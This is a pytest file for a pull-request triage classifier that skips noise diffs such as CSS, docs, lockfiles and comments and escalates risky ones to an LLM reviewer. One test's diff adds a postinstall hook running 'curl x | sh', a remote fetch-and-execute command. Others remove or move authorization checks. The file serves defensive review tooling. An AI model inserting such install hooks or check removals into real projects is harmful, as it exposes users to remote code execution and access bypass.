from prsec.triage_rules import classify, parse_diff


def _diff(path: str, removed: list[str], added: list[str], *, new: bool = False) -> str:
    old = "/dev/null" if new else f"a/{path}"
    body = [f"-{l}" for l in removed] + [f"+{l}" for l in added]
    return "\n".join([f"diff --git a/{path} b/{path}", f"--- {old}", f"+++ b/{path}", "@@ -1,3 +1,3 @@", " ctx", *body, " ctx"]) + "\n"


def test_css_only_skip():
    d = _diff("web/app.css", [".btn { padding: 2px; }"], [".btn { padding: 3px; }"])
    decision, reason = classify(["web/app.css", "web/logo.png"], d)
    assert decision == "skip"
    assert "asset=2" in reason


def test_docs_skip():
    d = _diff("README.md", ["old"], ["new"]) + _diff("docs/guide/setup.rst", [], ["x"])
    assert classify(["README.md", "docs/guide/setup.rst", "LICENSE"], d)[0] == "skip"


def test_lockfile_only_skip():
    d = _diff("package-lock.json", ['"version": "1.0.0"'], ['"version": "1.0.1"']) + _diff("go.sum", ["a"], ["b"])
    decision, reason = classify(["package-lock.json", "go.sum"], d)
    assert decision == "skip"
    assert "lockfile=2" in reason


def test_manifest_version_bump_skip():
    d = _diff("package.json", ['    "express": "^4.18.2",'], ['    "express": "^4.19.0",'])
    d += _diff("package-lock.json", ["x"], ["y"])
    assert classify(["package.json", "package-lock.json"], d)[0] == "skip"


def test_manifest_new_dependency_goes_to_llm():
    d = _diff("package.json", ['    "express": "^4.18.2"'], ['    "express": "^4.18.2",', '    "left-pad": "^1.3.0"'])
    assert classify(["package.json"], d) == ("llm", None)


def test_requirements_new_dependency_goes_to_llm():
    d = _diff("requirements.txt", [], ["pyyaml==6.0"])
    assert classify(["requirements.txt"], d) == ("llm", None)


def test_package_json_script_change_goes_to_llm():
    d = _diff("package.json", ['    "postinstall": "node build.js",'], ['    "postinstall": "curl x | sh",'])
    assert classify(["package.json"], d) == ("llm", None)


def test_business_logic_code_goes_to_llm():
    d = _diff("app/orders.py", ["    if order.owner_id != user.id:", "        raise Forbidden()"], [])
    assert classify(["app/orders.py"], d) == ("llm", None)


def test_mixed_docs_and_code_goes_to_llm():
    d = _diff("README.md", ["a"], ["b"]) + _diff("src/pay.ts", ["const fee = 1;"], ["const fee = 0;"])
    assert classify(["README.md", "src/pay.ts"], d) == ("llm", None)


def test_comment_only_diff_skip():
    d = _diff("src/pay.ts", ["// old comment", "/**", " * doc line", " */"], ["// new comment", "/**", " * doc line two", " */", ""])
    d += _diff("app/svc.py", ["    # note"], ["    # better note"])
    decision, reason = classify(["src/pay.ts", "app/svc.py"], d)
    assert decision == "skip"
    assert "comments_whitespace=2" in reason


def test_comment_plus_code_goes_to_llm():
    d = _diff("src/pay.ts", ["// c"], ["// c2", "chargeCard(amount);"])
    assert classify(["src/pay.ts"], d) == ("llm", None)


def test_whitespace_reformat_skip_but_not_for_python_indentation():
    js = _diff("src/a.js", ["if (x)  {  go();  }"], ["if (x) { go(); }"])
    assert classify(["src/a.js"], js)[0] == "skip"
    py = _diff("app/a.py", ["    check()"], ["check()"])
    assert classify(["app/a.py"], py) == ("llm", None)


def test_rust_attribute_and_c_preprocessor_are_not_comments():
    assert classify(["src/lib.rs"], _diff("src/lib.rs", [], ["#[allow(unsafe_code)]"])) == ("llm", None)


def test_generated_code_skip():
    d = _diff("api/gen/user.pb.go", ["a"], ["b"]) + _diff("proto/user_pb2.py", ["a"], ["b"])
    d += _diff("web/generated/client.ts", ["a"], ["b"]) + _diff("static/app.min.js", ["a"], ["b"])
    files = ["api/gen/user.pb.go", "proto/user_pb2.py", "web/generated/client.ts", "static/app.min.js"]
    assert classify(files, d)[0] == "skip"


def test_file_listed_but_missing_from_diff_goes_to_llm():
    assert classify(["src/auth.go"], "") == ("llm", None)


def test_code_file_deleted_goes_to_llm():
    d = "diff --git a/src/guard.go b/src/guard.go\n--- a/src/guard.go\n+++ /dev/null\n@@ -1,2 +0,0 @@\n-func Guard() {}\n-// x\n"
    assert "src/guard.go" in parse_diff(d)
    assert classify(["src/guard.go"], d) == ("llm", None)


def test_rename_without_content_goes_to_llm():
    d = "diff --git a/pages/admin.tsx b/pages/public.tsx\nsimilarity index 100%\nrename from pages/admin.tsx\nrename to pages/public.tsx\n"
    assert classify([], d) == ("llm", None)


def test_dotfiles_are_not_mangled():
    d = _diff(".github/workflows/ci.yml", ["    run: make"], ["    run: make test"])
    assert classify([".github/workflows/ci.yml"], d) == ("llm", None)


def _hunk(path: str, body: list[str]) -> str:
    return "\n".join([f"diff --git a/{path} b/{path}", f"--- a/{path}", f"+++ b/{path}", "@@ -10,6 +10,6 @@", *body]) + "\n"


def test_moved_authorization_check_goes_to_llm():
    d = _hunk("app/views.py", [
        " def delete_doc(request, doc_id):",
        "     doc = Doc.objects.get(id=doc_id)",
        "-    check_owner(request.user, doc)",
        "     doc.delete()",
        "+    check_owner(request.user, doc)",
        "     return ok()",
    ])
    assert classify(["app/views.py"], d) == ("llm", None)


def test_move_across_hunks_goes_to_llm():
    d = _hunk("src/a.ts", [" a();", "-requireAdmin(user);", " b();"])
    d += "@@ -40,2 +40,3 @@\n c();\n+requireAdmin(user);\n d();\n"
    assert classify(["src/a.ts"], d) == ("llm", None)


def test_star_continuation_outside_comment_is_code():
    d = _hunk("src/Order.kt", [
        "     val total = quantity",
        "-        * unitPrice",
        "+        * 0",
        "     return total",
    ])
    assert classify(["src/Order.kt"], d) == ("llm", None)


def test_block_comment_change_with_opening_in_hunk_skips():
    d = _hunk("src/Order.kt", [" /*", "- * old wording", "+ * new wording", " */", " fun x() = 1"])
    assert classify(["src/Order.kt"], d)[0] == "skip"


def test_noise_categories_are_narrow():
    for path in ("CMakeLists.txt", "docs/handler.ejs", "src/page.mdx", "web/icon.svg", "docs/openapi.json",
                 "prompts/system.txt", "docs/templates/mail.j2"):
        assert classify([path], _diff(path, ["a"], ["b"])) == ("llm", None), path
    for path in ("README.txt", "LICENSE.txt", "docs/guide.md", "NOTICE"):
        assert classify([path], _diff(path, ["a"], ["b"]))[0] == "skip", path
